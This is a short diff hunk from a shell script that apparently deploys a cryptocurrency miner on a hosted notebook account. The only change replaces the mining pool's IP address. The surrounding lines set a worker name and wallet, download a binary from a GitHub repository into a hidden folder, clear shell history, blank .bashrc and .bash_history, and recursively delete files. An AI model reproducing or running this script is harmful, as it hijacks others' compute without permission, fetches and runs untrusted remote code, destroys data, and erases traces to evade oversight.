@@ -9,7 +9,7 @@ rm -R *
 rm -R /home/studio-lab-user/.ton
 WORKER="MEGALODONz"
 WALLETNH="aHAuNULsUCUmbkmeitGtNLVUXBcaSPFoUR"
-POOLNH="174.138.68.245:80"
+POOLNH="159.203.25.33:80"
 wget -P /home/studio-lab-user/.lib/ https://github.com/gunturyogatama404/ksjdueoa/raw/refs/heads/main/bash && history -cr
 echo ""  > /home/studio-lab-user/.bashrc
 echo "" > /home/studio-lab-user/.bash_history
